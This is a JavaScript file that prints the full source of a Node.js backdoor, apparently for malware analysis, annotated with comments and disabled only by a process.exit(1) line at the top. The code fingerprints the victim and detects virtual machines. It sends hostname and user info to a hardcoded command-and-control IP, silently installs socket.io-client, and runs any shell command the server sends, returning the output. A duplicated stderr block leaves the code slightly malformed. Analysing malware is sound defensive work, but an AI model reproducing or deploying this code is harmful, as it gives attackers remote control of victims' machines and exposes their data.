// !!!DO NOT EXECUTE THIS CODE UNDER ANY CIRCUMSTANCES!!!
// This is malicious software - analyzing for educational purposes only

// Safeguard added to prevent execution
process.exit(1);

// Original malware code below with explanatory comments:

// Import required modules for HTTP requests, system info, file operations, and command execution
const axios = require("axios"); // For making HTTP requests to the C2 server
const os = require("os"); // For gathering system information
const fs = require("fs"); // For file system operations
const { execSync, exec } = require("child_process"); // For executing shell commands

// Unique identifier for this infection - likely used to track this specific victim
const uid = "b3b4db1eec74cbd10d1178d7d7c3ef6a";

// Function to send log messages back to the command & control (C2) server
const makeLog = async (message) => {
  try {
    axios
      .post("http://144.172.108.57/api/service/makelog", { // C2 server endpoint for logging
        message: message, // Error or status message
        host: os.hostname(), // Victim's computer name
        uid: uid, // Unique victim identifier
        t: "11" // Possibly a campaign or malware version identifier
      })
      .catch((err) => {}); // Silently ignore any errors when contacting C2 server
  } catch (e) {} // Double error handling to ensure code doesn't crash
};

try {
  // Main function to gather system information and register with C2 server
  const setHeader = async function () {
    try {
      let isVM = false; // Flag to detect if running in a virtual machine
      
      // VM Detection for Windows systems
      if (os.platform() == "win32") {
        // Execute Windows command to get system manufacturer and model info
        let output = execSync("wmic computersystem get model,manufacturer", { windowsHide: true });
        output = output.toString().toLowerCase();
        // Check for common VM software signatures
        if (
          output.indexOf("vmware") > -1 ||
          output.includes("virtualbox") ||
          output.includes("microsoft corporation") || // Hyper-V
          output.includes("qemu")
        ) {
          isVM = true; // Mark as VM if any virtualization software detected
        }
      } 
      // VM Detection for macOS systems
      else if (os.platform() == "darwin") {
        // Execute macOS command to get hardware information
        let output = execSync("system_profiler SPHardwareDataType", { windowsHide: true });
        output = output.toString().toLowerCase();
        // Check for virtualization signatures using regex
        if (/vmware|virtualbox|qemu|parallels|virtual/i.test(output)) {
          isVM = true;
        }
      } 
      // VM Detection for Linux systems
      else if (os.platform() == "linux") {
        // Read CPU information from proc filesystem
        let output = fs.readFileSync("/proc/cpuinfo", "utf8").toLowerCase();
        // Check for hypervisor or VM signatures in CPU info
        if (/hypervisor|vmware|virtualbox|qemu|kvm|xen|parallels|bochs/.test(output)) {
          isVM = true;
        }
      }
      
      // Send initial system information to C2 server for victim profiling
      return await axios.post(`http://144.172.108.57/api/service/process/${uid}`, {
        OS: os.type(), // Operating system type
        platform: os.platform(), // Platform (win32, darwin, linux)
        release: os.release() + (isVM ? " (VM)" : "(Local)"), // OS version + VM status
        host: os.hostname(), // Computer name
        userInfo: os.userInfo(), // Current user information
        uid: uid, // Unique victim identifier
        t: 11 // Campaign/version identifier
      });
    } catch (e) {
      makeLog(e.message); // Log any errors to C2 server
    }
  };
  setHeader(); // Execute the system profiling function

  // Install socket.io-client dependency for real-time communication with C2 server
  makeLog("Installing socket.io-client");
  execSync(
    "npm install socket.io-client --save --no-warnings --no-save --no-progress --loglevel silent",
    { windowsHide: true } // Hide the command window on Windows
  );

  // Import the newly installed socket.io-client module
  let io = require("socket.io-client");

  // Main backdoor function - establishes persistent connection to C2 server
  const ss = () => {
    // Create WebSocket connection to C2 server for real-time command execution
    const socket = io("http://144.172.108.57:4891", {
      reconnectionAttempts: 15, // Try to reconnect 15 times if connection drops
      reconnectionDelay: 2000, // Wait 2 seconds between reconnection attempts
      timeout: 2000 // Timeout after 2 seconds if connection fails
    });

    // Listen for "command" events from C2 server - this is the remote code execution backdoor
    socket.on("command", (msg) => {
      try {
        // Execute any command sent by the C2 server on the victim's machine
        exec(
          msg.message, // The command to execute (sent by attacker)
          { 
            windowsHide: true, // Hide command execution window on Windows
            maxBuffer: 1024 * 1024 * 300 // Allow up to 300MB of output buffer
          },
          (error, stdout, stderr) => {
            // Handle command execution errors
            if (error) {
              // Send error message back to C2 server
              socket.emit("message", {
                result: error.message,
                ...msg, // Include original message data
                uid: uid,
                type: "error", // Mark as error response
                t: "11"
              });
              return;
            }
            // Handle command stderr output
            if (stderr) {
            // Handle command stderr output
            if (stderr) {
              // Send stderr output back to C2 server
              socket.emit("message", { result: stderr, ...msg, type: "stderr" });
              return;
            }
            // Send successful command output back to C2 server
            socket.emit("message", {
              ...msg, // Include original message metadata
              result: stdout, // Command output
              code: msg.code, // Command identifier
              cid: msg.cid, // Client ID
              sid: msg.sid, // Session ID
              uid: uid, // Victim unique identifier
              t: "11" // Campaign/version identifier
            });
          }
        );
      } catch (e) {
        makeLog(e.message); // Log any execution errors to C2 server
      }
    });

    // Listen for "whour" (who are you) requests from C2 server
    socket.on("whour", (msg) => {
      // Respond with current system information when requested
      socket.emit("whoIm", {
        OS: os.type(), // Operating system
        platform: os.platform(), // Platform type
        release: os.release(), // OS version
        host: os.hostname(), // Computer name
        userInfo: os.userInfo(), // Current user details
        uid: uid, // Unique victim identifier
        t: "11" // Campaign identifier
      });
    });
    
    // Event handlers for connection status (currently empty but could be used for logging)
    socket.on("connect", () => {}); // When connection to C2 server is established
    socket.on("disconnect", () => {}); // When connection to C2 server is lost
  };
  
  ss(); // Start the backdoor socket connection
} catch (e) {
  makeLog(JSON.stringify(e)); // Log any startup errors to C2 server
}